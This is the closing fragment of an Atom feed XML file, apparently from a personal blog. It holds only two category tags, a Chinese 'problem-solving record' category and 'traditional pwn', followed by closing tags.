    <category term="做题记录" scheme="http://s1nec-1o.github.io/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
</feed>
